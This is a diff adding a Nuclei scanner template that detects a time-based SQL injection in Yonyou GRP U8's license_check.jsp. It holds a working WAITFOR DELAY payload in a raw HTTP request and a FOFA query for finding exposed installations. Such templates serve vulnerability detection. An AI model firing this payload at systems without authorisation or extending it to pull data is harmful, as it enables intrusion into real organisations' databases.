@@ -1,0 +1,28 @@
+id: yonyou-grp-u8-llicense_check-sqli
+info:
+  name: 用友 GRP U8 license_check.jsp - sqli
+  author: leadlife
+  severity: high
+  description: 
+  reference: 
+    - https://github.com/wy876/POC/blob/main/%E7%94%A8%E5%8F%8B%20GRP%20U8%20license_check.jsp%20%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5.md
+  metadata:
+    verified: true
+    fofa-query: app="用友-GRP-U8" || title="用友GRP-U8行政事业内控管理软件" || icon_hash="-299520369"
+  tags: yonyou,grpu8,sqli,oa,time
+
+http:
+  - raw:
+      - |
+        @timeout: 15s
+        GET /u8qx/license_check.jsp?kjnd=1';WAITFOR%20DELAY%20'0:0:6'-- HTTP/1.1
+        Host: {{Hostname}}
+        Accept-Encoding: identity
+        Content-Type: text/xml; charset=utf-8
+        Connection: close
+
+    matchers:
+      - type: dsl
+        dsl:
+          - duration >= 5 && duration < 9
+        condition: and
